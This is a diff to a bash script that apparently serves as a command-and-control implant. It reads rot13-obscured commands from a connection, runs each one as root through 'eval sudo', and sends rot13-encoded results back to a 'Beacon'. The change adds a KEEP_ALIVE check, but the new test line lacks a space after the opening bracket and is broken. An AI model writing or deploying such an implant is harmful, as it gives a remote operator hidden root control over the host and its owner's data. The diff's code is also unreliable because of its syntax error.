@@ -62,12 +62,14 @@ while true; do
     if [[ "$command" != "HTTP/1.1 200 OK" ]] && [[ "$command" != "Content-Length"* ]] && [[ "$command" != "Content-Type: text/plain; charset=utf-8" ]] && [[ -n "$command" ]]; then
       # Convert Cipher text to plain text
       command=$(rot13 "$command")
-      # Run the command
-      result=$(eval "sudo $command")
-      # Convert the result into cipher text
-      result=$(rot13 "$result")
-      # Send the result back to the Beacon
-      echo "$result" >&3
+      if ["$command" != "KEEP_ALIVE" ]; then
+        # Run the command
+        result=$(eval "sudo $command")
+        # Convert the result into cipher text
+        result=$(rot13 "$result")
+        # Send the result back to the Beacon
+        echo "$result" >&3
+      fi
     fi
   fi
 done
